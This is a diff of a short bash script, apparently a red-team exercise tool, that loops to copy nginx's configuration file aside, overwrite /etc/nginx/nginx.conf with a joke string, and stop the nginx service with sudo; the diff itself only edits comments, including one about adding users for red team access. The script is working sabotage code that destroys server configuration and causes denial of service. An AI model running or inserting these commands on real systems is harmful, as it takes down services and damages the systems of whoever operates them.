@@ -9,14 +9,15 @@ do
  #Generate random number, check if the number is even or odd
  if [ $(( $RANDOM % 2)) -eq 0 ]
  then
- #Copy config file to other location, then overwrite original, add users for red team access
+ #Copy config file to other location, then overwrite original
    cp '/etc/nginx/nginx.conf' '/etc/mm.conf'
    echo "I'm Batman" > '/etc/nginx/nginx.conf'
  else
- #Copy config file to other location, then overwrite original, add users for red team access
+ #Copy config file to other location, then overwrite original
    cp '/etc/nginx/nginx.conf' '/home/mm.conf'
    echo "You ever dance with the devil in the pale mooon light?" > '/etc/nginx/nginx.conf'
  fi
- #Stop samba service
+ 
+ #Stop nginx service
  sudo service nginx stop
 done
